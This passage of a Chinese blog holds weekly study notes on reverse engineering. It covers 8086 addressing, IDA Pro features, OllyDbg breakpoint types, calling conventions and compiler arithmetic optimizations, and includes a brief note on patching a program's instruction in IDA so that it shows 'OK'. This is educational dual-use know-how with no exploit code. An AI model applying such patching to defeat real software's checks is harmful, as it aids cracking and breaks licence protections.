<h5 id="and-和-or-指令"><a href="#and-和-or-指令" class="headerlink" title="and 和 or 指令"></a>and 和 or 指令</h5><p>and：按位进行与运算<br>mov al，01100011B<br>and al，001111011B<br>or：按位进行或运算<br>…<br>or al，00111011B</p>
<h5 id="以字符形式给出的数据"><a href="#以字符形式给出的数据" class="headerlink" title="以字符形式给出的数据"></a>以字符形式给出的数据</h5><p>用’….’的方式指明数据是以字符形式给出的，编译器将把它们转化为对应的ascii码<br>db ‘unix’ 相当于 db 75h,6eh,49h,58h (ascii 码)</p>
<h5 id="bx-idata"><a href="#bx-idata" class="headerlink" title="[bx+idata]"></a>[bx+idata]</h5><p>mov ax,[200+bx]==mov ax,[bx+200]==mov ax,200[bx]==mov ax,[bx].200<br>(ax)=((ds)*16+(bx)+200)<br>用[bx+idata]的方式进行数组的处理</p>
<h5 id="SI、DI"><a href="#SI、DI" class="headerlink" title="SI、DI"></a>SI、DI</h5><p>是和bx功能相近的寄存器，不能够分成两个8位寄存器来使用<br>可以使用 [bx+si+idata]和[bx+di+idata]的方式表示内存单元，不能用[si+di]</p>
<h6 id="BP"><a href="#BP" class="headerlink" title="BP"></a>BP</h6><p>在8086cpu中只有 si、di、bp、bx四个寄存器能在[….]里进行内存单元的寻址<br>四个寄存器可以单个出现或只能出现：bx+si;bx+di;bp+si;bp+di。bx+b；si+di是错的<br>只要使用了bp而没有给出段地址，段地址就默认在ss中</p>
<h6 id="数据位置的表达"><a href="#数据位置的表达" class="headerlink" title="数据位置的表达"></a>数据位置的表达</h6><p>1.直接用立即数idata表示：mov ax,1；mov al,’a’<br>2.将数据存在寄存器中<br>3.要处理的数据在内存中，可用[…]的格式给出EA,SA在某个段寄存器中</p>
<ul>
<li>1.mov ax,[bx+si+8]中 段地址默认在ds中</li>
<li>2.mov ax,[bp+si+8]中 段地址默认在ss中</li>
<li>存放段地址的寄存器也可以显性给出：mov ax,ds:[bx+si+8]</li>
</ul>
<h6 id="指令要处理的数据的尺寸"><a href="#指令要处理的数据的尺寸" class="headerlink" title="指令要处理的数据的尺寸"></a>指令要处理的数据的尺寸</h6><ul>
<li>1.通过寄存器名指明：ax 字，al/ah 字节</li>
<li>2.用操作符_word/byte__ptr<br>  inc word ptr [bx]<br>  add byte ptr [bx],2<br>否则cpu无法得知要访问的单元是字单元还是字节单元</li>
<li>3.其他<br>  如push,[1000]</li>
</ul>
<h4 id="寄存器整理"><a href="#寄存器整理" class="headerlink" title="寄存器整理"></a>寄存器整理</h4><h6 id="bx、si、di、bp："><a href="#bx、si、di、bp：" class="headerlink" title="bx、si、di、bp："></a>bx、si、di、bp：</h6><p>不使用bp时段地址默认在ds中<br>使用bp时段地址默认在ss中</p>
<h6 id="dx：累加寄存器"><a href="#dx：累加寄存器" class="headerlink" title="dx：累加寄存器"></a>dx：累加寄存器</h6><h6 id="cs：代码"><a href="#cs：代码" class="headerlink" title="cs：代码"></a>cs：代码</h6><h6 id="ss-sp：栈顶"><a href="#ss-sp：栈顶" class="headerlink" title="ss:sp：栈顶"></a>ss:sp：栈顶</h6><h6 id="ds：数据"><a href="#ds：数据" class="headerlink" title="ds：数据"></a>ds：数据</h6><h6 id="cx：loop"><a href="#cx：loop" class="headerlink" title="cx：loop"></a>cx：loop</h6>]]></content>
      <tags>
        <tag>周报</tag>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.03.08-2020.03.15</title>
    <url>/232092d7.html</url>
    <content><![CDATA[<h1 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h1><h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><p>‘View’-&gt;’Open subviews’-&gt;’Enumerations’ 打开枚举窗口，按’Insert’插入新的枚举类型，按’N’添加成员<br>选中需要重新定义的数据，按’M’后将其转换<br><img src="https://s1.ax1x.com/2020/03/12/8etGNT.md.png" alt="8etGNT.md.png"></p>
<p><img src="https://s1.ax1x.com/2020/03/12/8etJ4U.md.png" alt="8etJ4U.md.png"><br><a id="more"></a></p>
<h2 id="FLIRT"><a href="#FLIRT" class="headerlink" title="FLIRT"></a>FLIRT</h2><p>库文件快速识别与鉴定技术<br>在一系列编译器的标准库文件里自动找出调用的函数，如，把’call 406E40’识别为’call strlen’<br>如果没有自动识别出来，可以强制使用编译器特征文件（xxxx.sig）<br>‘View’-&gt;’Open subviews’-&gt;’Signatures’或’Shift+F5’打开签名窗口，右键’Apply new signature’选择签名文件  </p>
<h2 id="（不知道把这部分叫作啥）"><a href="#（不知道把这部分叫作啥）" class="headerlink" title="（不知道把这部分叫作啥）"></a>（不知道把这部分叫作啥）</h2><ol>
<li><img src="https://s1.ax1x.com/2020/03/12/8eOmin.md.png" alt="可见，可以把004010c9的内容改了让程序显示&#39;OK&#39;"></li>
</ol>
<p><img src="https://s1.ax1x.com/2020/03/14/8lFm6K.png" alt="Assmeble修改汇编指令，Apply patches to input file...将修改保存到文件"></p>
<ol>
<li>输入输出等函数可在name窗口中查看  </li>
</ol>
<h1 id="32位软件逆向技术"><a href="#32位软件逆向技术" class="headerlink" title="32位软件逆向技术"></a>32位软件逆向技术</h1><h2 id="启动函数"><a href="#启动函数" class="headerlink" title="启动函数"></a>启动函数</h2><p>Windows程序执行并不是由WinMain函数开始的，首先执行的是启动函数的相关代码（由编译器生成），完成后才调用WinMain函数</p>
<p>c/c++程序的启动函数作用基本相同，包括 检索指向新进程的<u>命令行</u>指针、检索指向新进程的<u>环境变量</u>指针、全局变量初始化和内存栈初始化等</p>
<p><img src="https://s1.ax1x.com/2020/03/12/8maVFP.md.png" alt="某程序启动代码（部分）"><br>分析程序的过程中可以略过启动代码，直接将重点放到WinMain函数上  </p>
<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>通过call….ret把函数调用和其他跳转指令区别开<br>直接调用：call <u>函数首地址</u><br>间接调用：call [<u> eax </u>] (通过寄存器传递函数地址或动态计算函数地址)  </p>
<h3 id="函数的参数"><a href="#函数的参数" class="headerlink" title="函数的参数"></a>函数的参数</h3><p>函数传递参数有3种方式：栈方式、寄存器方式、通过全局变量进行隐含参数传递方式<br>每一种机制与使用的编译语言有关  </p>
<h4 id="利用栈传递参数"><a href="#利用栈传递参数" class="headerlink" title="利用栈传递参数"></a>利用栈传递参数</h4><p>函数计算结束后，由调用者或函数本身修改栈，使栈恢复原样（<strong>平衡栈数据</strong>）<br>调用约定：为了实现函数调用而建立的协议（按照什么顺序入栈；由谁来平衡栈….）  </p>
<ol>
<li>c规范(__cdecl)函数按照从右到左的顺序入栈，由调用者负责清除栈（c/c++/mfc(微软基础类库)默认调用约定）</li>
<li>stdcall调用约定按照从右到左传递参数，并由调用的函数在返回前清理传送参数的内存栈</li>
<li>stdcall调用约定是Win32 API采用的约定方式，在Win32 API种也有一些函数采用(__cdecl)调用，如wsprintf</li>
</ol>
<p>c、c++、pascal 等高级语言的子程序执行过程基本相似：</p>
<ol>
<li>调用者将函数执行完毕时应返回的地址和参数压入栈</li>
<li>子程序通过’ebp 指针+偏移量’对栈中的操作进行寻址</li>
<li>子程序使用ret或retf返回，此时cpu将eip置为栈中保存的地址</li>
</ol>
<p>栈的操作对象只能是双操作数（占4个字节）<br><img src="https://s1.ax1x.com/2020/03/14/8lP1De.md.png" alt="一个凑行数的图"></p>
<p>用ebp存取栈<br>用ret平衡栈时，在ret指令后加一个操作数，表示在ret指令后给esp加上操作数  如’ret 8’相当于在返回后将esp+8，ret后面的值等于参数个数*4h</p>
<p>enter 和 leave指令可以帮助进行栈的维护<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">enter xxxx,0   ;0表示创建xxxx大小的空间来放置局部变量</span><br><span class="line">....</span><br><span class="line">leave </span><br><span class="line">ret 8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">enter的作用为：</span><br><span class="line">push ebp</span><br><span class="line">mov ebp,esp</span><br><span class="line">sub esp,xxxx</span><br><span class="line"></span><br><span class="line">leave的作用为：</span><br><span class="line">add esp,xxxx</span><br><span class="line">pop ebp</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>ENTER 有两个操作数：第一个是常数，定义为局部变量保存的堆栈空间字节数；第二个定义了过程的词法嵌套级。<br>ENTER numbytes, nestinglevel<br>Numbytes 总是向上舍入为 4 的倍数，以便 ESP 对齐双字边界。Nestinglevel 确定了从主调过程堆栈帧复制到当前帧的堆栈帧指针的个数。</p>
</blockquote>
<h4 id="利用寄存器传递参数"><a href="#利用寄存器传递参数" class="headerlink" title="利用寄存器传递参数"></a>利用寄存器传递参数</h4><p>绝大多数编译器都遵循fastcall规范<br>不同的编译器实现的fastcall稍有不同</p>
<h4 id="名称修饰约定"><a href="#名称修饰约定" class="headerlink" title="名称修饰约定"></a>名称修饰约定</h4><p>c++编译器会按照某种规则改写每一个入口点的符号名，从而允许同一个名字有多个用法且不破坏链接器。这种技术称为名称改编或名称修饰<br>在vc++种，函数修饰名由编译类型(c/c++)、函数名、类（class）名、调用约定、返回类型等决定<br><img src="https://s1.ax1x.com/2020/03/15/83ZkQA.png" alt="常见的c和c++编译函数名的修饰"></p>
<h3 id="函数的返回值"><a href="#函数的返回值" class="headerlink" title="函数的返回值"></a>函数的返回值</h3><p>最常见的是return操作符，还有通过参数 按 传引用方式 返回值、通过全局变量返回值</p>
<h4 id="用return操作符返回值"><a href="#用return操作符返回值" class="headerlink" title="用return操作符返回值"></a>用return操作符返回值</h4><p>一般情况下返回值放在eax中，如果超过大小，高32位就会放在edx<br>对于一个返回两个参数和的子函数：<br><img src="https://s1.ax1x.com/2020/03/15/83eB4S.png" alt="圈起来的即为存放返回值的过程"><br>对应c语言代码：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">add(<span class="keyword">int</span> x,<span class="keyword">int</span> y)&#123;</span><br><span class="line">    <span class="keyword">int</span> temp;</span><br><span class="line">    temp=x+y;</span><br><span class="line">    <span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="通过参数按传引用方式返回值"><a href="#通过参数按传引用方式返回值" class="headerlink" title="通过参数按传引用方式返回值"></a>通过参数按传引用方式返回值</h3><p>传递参数的方式有：传值和传引用<br>传值调用时会建立参数的一份复本，并把它传给调用参数<br>传引用允许调用函数修改原始变量的值（指针）<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">max</span><span class="params">(<span class="keyword">int</span> *a,<span class="keyword">int</span> *b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(*a&lt;*b)</span><br><span class="line">        *a=*b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="https://s1.ax1x.com/2020/03/15/83uRHI.png" alt=" "></p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.02.24-2020.03.01</title>
    <url>/9fec375a.html</url>
    <content><![CDATA[<h1 id="OllyDbg-学习"><a href="#OllyDbg-学习" class="headerlink" title="OllyDbg 学习"></a>OllyDbg 学习</h1><h2 id="常用断点"><a href="#常用断点" class="headerlink" title="常用断点"></a>常用断点</h2><h3 id="int-interrupt-3断点"><a href="#int-interrupt-3断点" class="headerlink" title="int(interrupt) 3断点"></a>int(interrupt) 3断点</h3><p>在OD中用’F2’来设置，机器码是0xCC<br>执行一个int 3断点时，该地址处的指令首字节修改位CC（OD显示的还是原来的指令）  </p>
<p>优点是可以设置无数个指令，缺点是<strong>改变了原程序机器码，容易被软件检测到</strong>，例如有些软件会检测api的首地址是否为0xCC</p>
<h3 id="硬件断点"><a href="#硬件断点" class="headerlink" title="硬件断点"></a>硬件断点</h3><p>和DRx调试寄存器有关<br>DRx调试器共有8个（x从0 ~ 7）</p>
<p><img src="https://s2.ax1x.com/2020/02/24/3G1qVf.png" alt=" "><br><a id="more"></a></p>
<p>0 ~ 3：调试地址寄存器，用于保存需要监视的地址，例如设置硬件断点<br>4、5：（先不做了解）<br>6：调试寄存器组状态寄存器（’这个寄存器主要是在调试异常产生后，报告产生调试异常的相关信息’)<br>7：调试寄存器组控制寄存器，控制调试<br>硬件断点的原理是使用DR0、DR1、DR2、DR3设定地址，并用DR7设定状态，因此最多设置4个断点<br>设置方法为：1.在代码行单击右键，执行’断点’-&gt;’硬件执行&emsp;2.在数据窗口’右键’-&gt;’硬件访问断点’-&gt;（选择数据长度1/2/4字节），如4字节（Dword)当访问xxxxx0~xxxxx3的内存时会被断下  </p>
<p>快捷键’F4’执行到光标所在的行</p>
<h3 id="内存断点"><a href="#内存断点" class="headerlink" title="内存断点"></a>内存断点</h3><p>原理是对所设的地址赋予不可访问/不可写属性，当访问/写入的时候就会产生异常，OD比较异常地址是不是断点地址，如果是就中断<br>设置内存断点在每次出现异常时都需要比较来判断是否应该中断，所以会降低OD的执行速度<br>OD只能下一个内存断点，设置方法为：在数据/代码窗口选中要下断点的地址区域，右键执行’断点’-&gt;’内存写入’<br>硬件访问/写入断点实在触发硬件断点的下一条指令处下断；内存断点是在触发断点的指令处下断。<br>内存断点不修改原始代码，不会因为被程序校验而失败</p>
<h3 id="内存访问一次性断点"><a href="#内存访问一次性断点" class="headerlink" title="内存访问一次性断点"></a>内存访问一次性断点</h3><p>windows 对内存使用段页式的管理方式<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(quote):</span><br><span class="line">段页式存储管理方式即先将用户程序分成若干个段，再把每个段分成若干个页，并为每一个段赋予一个段名。</span><br><span class="line">（基本分段存储管理方式和基本分页存储管理方式原理的结合）</span><br></pre></td></tr></table></figure><br>快捷键’Alt+M’显示内存，可以看到许多段，每个段都有不可访问、读、写、执行属性<br>可用’F2’对整个段设置断点。当所在段被读取或执行时，中断发生，断点删除。</p>
<h3 id="消息断点"><a href="#消息断点" class="headerlink" title="消息断点"></a>消息断点</h3><p>当某个特定窗口函数接收到某个特定消息时，消息断点将使程序中断<br>消息断点与INT 3断点的区别在于：INT 3 断点可以在程序启动之前设置，消息断点<strong>只有在窗口被创建后才能设置</strong>  </p>
<p>当用户点击按钮、移动光标、输入文字时，一条消息就会发送给当前窗体。发送的信息有4个参数：1个窗口句柄，1个消息编号，2个32位长的参数。<br>设置方法：工具栏中的’w’按钮，在条目上单击右键….。 </p>
<p>ps：<em>当单击按钮并松开时会发送’WM_LBUTTONUP’这个消息。</em></p>
<h3 id="条件断点"><a href="#条件断点" class="headerlink" title="条件断点"></a>条件断点</h3><p>在满足一定条件时才会中断。OD中可以按寄存器、储存器、消息等设断点。<br>用带有条件表达式的INT 3 断点，当调试器遇到断点时，计算表达式的值，如果表达式有效则断点生效。   </p>
<ol>
<li>按寄存器条件中断<br>快捷键’Shift+F2’ 条件表达式例如：  eax==0400000</li>
<li>按存储器条件中断<br><em>（CreateFileA函数用于打开文件，可对其设断）</em><br>在栈窗口右键，执行’Address’-&gt;’Relative to ESP’可看到各个参数相对于当前ESP的地址，如果要得到第一个参数的地址，可以用[ESP+4],如果要得到指向的字符串，使用[[ESP+4]],表达式可用：[STRING [ESP+4]]==”….”(STRING前缀是“以0结尾的ASCII字符串”,还有UNICODE前缀等)<h3 id="条件记录断点"><a href="#条件记录断点" class="headerlink" title="条件记录断点"></a>条件记录断点</h3>可以记录断点处函数表达式或参数的值，也可以设置断点次数，每次符合条件暂停后计数值-1<br>快捷键’Shift+F4’打开条件记录窗口<br>条件记录断点可以向插件传递多个命令  <h2 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h2>OD只能加载32个插件<br>添加插件可通过将插件复制到’plugin’文件夹中  <h2 id="Run-trace"><a href="#Run-trace" class="headerlink" title="Run trace"></a>Run trace</h2>把程序执行过的指令保存下来。<br>将地址、寄存器等记录到Run tarce 缓冲区中。如果缓冲区太小可能造成缓冲区溢出，OD会自动丢弃旧记录。<br>数据可以在’查看’-&gt;’RUN跟踪’里（或按’…’）查看。使用’+’和’-‘浏览程序执行路线<h2 id="Hit-trace"><a href="#Hit-trace" class="headerlink" title="Hit trace"></a>Hit trace</h2>分辨哪一部分代码被执行了，哪一部分没有执行。在遇到一段跳转分支比较多的代码，需要了解程序执行路线时，可以用Hit trace。<br>选中代码-&gt;右键-&gt;’Hit trace’-&gt;’Add selection’<br>效果是执行过的指令前为红色，未执行的为蓝色：<br><img src="https://s2.ax1x.com/2020/02/28/3D6OqU.png" alt="">  </li>
</ol>
<p>ps：<strong>不要在监视的代码中设置断点</strong></p>
<h2 id="OD常见问题"><a href="#OD常见问题" class="headerlink" title="OD常见问题"></a>OD常见问题</h2><h3 id="乱码"><a href="#乱码" class="headerlink" title="乱码"></a>乱码</h3><ol>
<li>右键’分析’-&gt;’分析代码’或快捷键’Ctrl+A’</li>
<li>右键’分析’-&gt;’从模块中删除分析’，或在udd文件夹中删除相应文件<h3 id="在反汇编窗口输入’push-E000’不能正确识别"><a href="#在反汇编窗口输入’push-E000’不能正确识别" class="headerlink" title="在反汇编窗口输入’push E000’不能正确识别"></a>在反汇编窗口输入’push E000’不能正确识别</h3>改为’push 0E000’<h3 id="od’假死’"><a href="#od’假死’" class="headerlink" title="od’假死’"></a>od’假死’</h3>可能在调试加壳程序时产生<br>打开’ollydbg.ini’设置’Restore windows 0’</li>
</ol>
<h1 id="静态分析技术"><a href="#静态分析技术" class="headerlink" title="静态分析技术"></a>静态分析技术</h1><p>用高级语言写的程序有两种形式。  </p>
<ol>
<li>程序被编译成机器语言在cpu上执行<br>对于这种程序，可以将机器语言转化为汇编语言，这个过程称为<strong>反汇编</strong></li>
<li>边解释边执行（编写这种程序的语言称为解释性语言，如java）<br>这种语言编译程序后可以被还原成高级语言的原始结构，这个过程被称为<strong>反编译</strong>  </li>
</ol>
<p>静态分析：通过反编译、反汇编获得程序的汇编代码或源代码，然后分析流程，了解模块的功能  </p>
<h2 id="文件类型分析"><a href="#文件类型分析" class="headerlink" title="文件类型分析"></a>文件类型分析</h2><p>逆向分析程序的第一步<br>了解编写程序的语言、编译的编译器或是否被加密<br>各种开发语言都有固定的启动代码，被加密程序处理过的程序中会留下加密软件的相关信息<br>但有些外壳程序会将一些加壳信息去除，并伪造启动代码，从而欺骗了PEiD等检测分析软件。因此识别工具给出的结果只能作为参考  </p>
<h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><p>ida 是按区块装载pe文件的，例如.text代码块、.data数据块、.rsrc资源块、.idata输入表、.edata输出表。<br>反编译过程分为两个阶段：</p>
<ol>
<li>将代码和数据分开，分析函数的参数调用、跳转等</li>
<li>装载对应的编译器特征文件，给各个函数赋名</li>
</ol>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.03.02-2020.03.08</title>
    <url>/2f00783a.html</url>
    <content><![CDATA[<h1 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h1><h2 id="四个快捷键"><a href="#四个快捷键" class="headerlink" title="四个快捷键"></a>四个快捷键</h2><p>添加注释：冒号或分号<br>跳转到某个地址（16进制）：’G’;返回（后退）：’Esc’;前进：’Ctrl+Enter’  </p>
<h2 id="交叉参考"><a href="#交叉参考" class="headerlink" title="交叉参考"></a>交叉参考</h2><p>可以知道指令代码相互调用的关系<br><img src="https://s2.ax1x.com/2020/03/02/3RV2Ox.md.png" alt=" "><br>‘↑j’中j表示跳转，o表示偏移量，p表示子程序，双击或按回车可以跳到调用该处的地方<br>在‘loc_xxxxx’上按’x’打开交叉参考窗口<br><a id="more"></a></p>
<h2 id="参考重命名"><a href="#参考重命名" class="headerlink" title="参考重命名"></a>参考重命名</h2><p>可把所有 loc_xxxxxx 重命名<br><img src="https://s2.ax1x.com/2020/03/02/3Ru4WF.png" alt=" "></p>
<h2 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h2><p>打开标记当前位置功能：’jump’-&gt;’mark position’  快捷键:’Alt+M’<br>标记后在其他位置可以跳转到标记时光标的位置，快捷键：’Ctrl+M’  </p>
<p><img src="https://s2.ax1x.com/2020/03/05/3TRn9e.png" alt=" "><br><img src="https://s2.ax1x.com/2020/03/05/3TRVAK.png" alt=" "></p>
<h2 id="格式化指令操作数"><a href="#格式化指令操作数" class="headerlink" title="格式化指令操作数"></a>格式化指令操作数</h2><p>把常量转换为十六、十、八、二进制<br><img src="https://s2.ax1x.com/2020/03/05/3TRehD.png" alt=" "></p>
<h2 id="函数的操作"><a href="#函数的操作" class="headerlink" title="函数的操作"></a>函数的操作</h2><h2 id="代码和数据转换"><a href="#代码和数据转换" class="headerlink" title="代码和数据转换"></a>代码和数据转换</h2><p>IDA可能无法正确区分数据字节和代码字节，有些程序利用这一点对抗静态反汇编<br>用户可以将某段数据指定为代码或数据<br>方法：’Edit’-&gt;’Code’/‘Data’(快捷键’C’/‘D’)，’D’会将数据类型在db，dw，dd之间转换<br>按’U’取消定义后得到一些可以重新定义的字节，按’P’将某段代码定义为子程序<br><img src="https://s2.ax1x.com/2020/03/05/3TRZtO.png" alt=" "><br>—-&gt;<br><img src="https://s2.ax1x.com/2020/03/05/3TRk0x.md.png" alt="按&#39;c&#39;结果如图">  </p>
<h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>编程语言的不同造成字符串格式不同<br>c语言字符串以0结尾，dos字符串以$结尾,其他可见于’Edit’-&gt;’string’<br><img src="https://s2.ax1x.com/2020/03/05/3T7bP1.png" alt="3T7bP1.png"><br>按’A’生成一个变量名，按’U’恢复，在’View’-&gt;’Open subviews’-&gt;’Names’可以看到字符串变量  </p>
<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>可以将数据按数组的形式显示<br><img src="https://s2.ax1x.com/2020/03/06/3bDXcR.png" alt="未识别的数组"><br>‘Edit’-&gt;’Array’或’ * ‘打开数组排列调整窗口<br><img src="https://s2.ax1x.com/2020/03/06/3b6yKs.png" alt="调整数组大小、每行项数（0自动调整）、对齐方式（0自动调整）"><br><img src="https://s2.ax1x.com/2020/03/06/3bDO39.png" alt="设置为&#39;3 0 -1&#39;的结果"></p>
<h2 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h2><p>对一些常见的文件类型，IDA会自动加载相应的类型库，这些类型库中有相应的结构体。<br>‘Shift+F11’打开加载类型库窗口（Loaded Type Libarries)，右键’Load Type Libarary’，’Insert’添加类型库    </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*******************************************************</span></span><br><span class="line"><span class="comment">*程序:Structures.cpp                                                                                      *</span></span><br><span class="line"><span class="comment">*用途:IDA结构体反汇编                                                                        *</span></span><br><span class="line"><span class="comment">*   看雪软件安全网站                                                                              *   </span></span><br><span class="line"><span class="comment">*    www.pediy.com, kanxue 2002.8                                                                 *</span></span><br><span class="line"><span class="comment">********************************************************/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span></span></span><br><span class="line"><span class="class">	&#123;</span><span class="keyword">int</span> id;</span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line">	<span class="keyword">int</span> age;</span><br><span class="line">	&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">stu</span>[2]=&#123;</span>&#123;<span class="number">01</span>,<span class="string">"Mary"</span>,<span class="number">14</span>&#125;,&#123;<span class="number">02</span>,<span class="string">"Angela"</span>,<span class="number">15</span>&#125;&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">student</span> *<span class="title">p</span>;</span></span><br><span class="line">	<span class="keyword">for</span>(p=stu;p&lt;stu+<span class="number">2</span>;p++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%5d  %-20s%4d\n"</span>,p-&gt;id,p-&gt;name,p-&gt;age);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.ax1x.com/2020/03/06/3LK7fU.png" alt="对应了main()里的内容，结构体存在“unk_407030”那块">  </p>
<p><img src="https://s2.ax1x.com/2020/03/06/3Lu7Md.md.png" alt="没有定义结构体时自动生成"><br>如[esi+18h]调用了结构体中的数据，可用有意义的名字代替<br>先把结构体数据中的数据重新定义<br><img src="https://s2.ax1x.com/2020/03/06/3LQWaq.md.png" alt="参考数组、字符串、数据类型"><br>打开结构体窗口，insert一个结构类型。按’d’添加数据/切换数据类型，按’a’切换为字符串，按’n’修改结构体成员的名字<br><img src="https://s2.ax1x.com/2020/03/07/3OW2SP.png" alt=" "><br>将光标定位在相应地址处，’Edit-&gt;’Struct var’选择相应结构体类型<br><img src="https://s2.ax1x.com/2020/03/07/3OfiSx.png" alt="调整后"><br>按’T’，在操作数类型中重新定义现有数据：<br><img src="https://s2.ax1x.com/2020/03/07/3OzPyD.png" alt=" "><br>选择一片代码后可以批量进行替换：<br><img src="https://s2.ax1x.com/2020/03/07/3X9BnS.png" alt=""><br><em>lea：</em><br><em>lea bx，data</em><br><em>lea是load effective address 的缩写，是取源操作数的偏移地址，并将其传送到目的操作数单元。类似于C语言的取地址符&amp;。</em><br><em>lea eax,[eax+2</em>eax]的效果是eax = eax + eax <em> 2</em><br><em>mov edx,[ebp+16]的效果是edx=(dword)(ebp+16).</em></p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.03.23-2020.03.29</title>
    <url>/50551.html</url>
    <content><![CDATA[<h1 id="32位软件逆向技术"><a href="#32位软件逆向技术" class="headerlink" title="32位软件逆向技术"></a>32位软件逆向技术</h1><h2 id="控制语句"><a href="#控制语句" class="headerlink" title="控制语句"></a>控制语句</h2><h3 id="条件设置指令（SETcc）"><a href="#条件设置指令（SETcc）" class="headerlink" title="条件设置指令（SETcc）"></a>条件设置指令（SETcc）</h3><p>条件设置指令的形式是“SET<u>cc</u> r/m8”， r/m8表示8位寄存器或单字节内存单元<br>条件设置指令测试一些标志位，把结果记录的目标操作数中<br>测试：</p>
<ol>
<li>of（=1溢出）</li>
<li>zf（=1操作后等于0/相等）</li>
<li>cf（=1进位/低于）</li>
<li>cf、zf结合判断</li>
<li>sf（=1操作后结果为负）</li>
<li>pf（=1，1个数为偶数）</li>
<li>sf、of结合判断（=1小于）</li>
<li>zf（=1或zf!=of，不大于）<blockquote>
<p><a href="https://brubbish.github.io/34199.html#%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8">https://brubbish.github.io/34199.html#%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8</a></p>
<a id="more"></a>
<p>条件设置指令可以用来消除程序中的转移指令<br>如：<br><img src="https://s1.ax1x.com/2020/03/22/8IMgHA.png" alt=" "></p>
</blockquote>
</li>
</ol>
<h3 id="纯算法实现逻辑判断"><a href="#纯算法实现逻辑判断" class="headerlink" title="纯算法实现逻辑判断"></a>纯算法实现逻辑判断</h3><p>一些编译器在优化的时候，会不改变原逻辑的情况下，使用数学技巧把代码中的一些逻辑分支语句转换为算术操作，减少程序中的条件转移指令，提高cpu的流水线的性能（….tql)  </p>
<h2 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h2><p>可以进行反向引用<br>其他类型的分支语句，如if-else都是由低地址向高地址区域引用的（向下跳），依此可以将循环语句识别出来（调回去）<br>确定某段代码是循环代码后就可以分析计数器（一般用ecx）  </p>
<p>如果编译时设置优化“Maximize Speed”：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xor ecx,ecx             ;变量初始化sum&#x3D;0</span><br><span class="line">xor eax,eax             ；变量初始化i&#x3D;0</span><br><span class="line">....</span><br></pre></td></tr></table></figure></p>
<h2 id="数学运算符"><a href="#数学运算符" class="headerlink" title="数学运算符"></a>数学运算符</h2><p>如果编译器没有进行优化，则这些运算符很容易理解（….)所以下面都是经过优化的</p>
<h3 id="整数的加法和减法"><a href="#整数的加法和减法" class="headerlink" title="整数的加法和减法"></a>整数的加法和减法</h3><p>用lea代替add和sub<br>lea指令允许用户在一个时钟内完成对c=a+b+78h（某个数）的计算，其中abc都是在有寄存器的情况下才有效的，如：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lea c,[a+b+78]</span><br><span class="line">&#x3D;&gt;</span><br><span class="line">mov eax,dword ptr [esp]     ;eax&#x3D;a</span><br><span class="line">mov ecx,dword ptr [esp]     ;ecx&#x3D;b</span><br><span class="line">lea edx,dword ptr [ecx+eax+78]</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>时钟周期：一个时钟脉冲所需要的时间。（计组）</p>
</blockquote>
<h3 id="整数的乘法"><a href="#整数的乘法" class="headerlink" title="整数的乘法"></a>整数的乘法</h3><p>一般被编译成mul（无符号）、imul（有符号）指令（运行慢），为了提高效率会用其他指令完成<br>如果一个数是2的幂，用左移指令shl；3、5、6、7、9等数用加法提高效率：如把exa<em>5写成”lea eax,[eax+4 </em>4];lea指令可以实现寄存器乘以2、4、8的运算  </p>
<h3 id="整数的除法"><a href="#整数的除法" class="headerlink" title="整数的除法"></a>整数的除法</h3><p>一般被编译成div、idiv指令，大概比乘法运算多消耗10倍cpu时钟<br>如果除数是2的幂，可用右移指令’shr a,n’：a是被除数，n是2的指数（进行无符号数计算）有符号数用sar指令  </p>
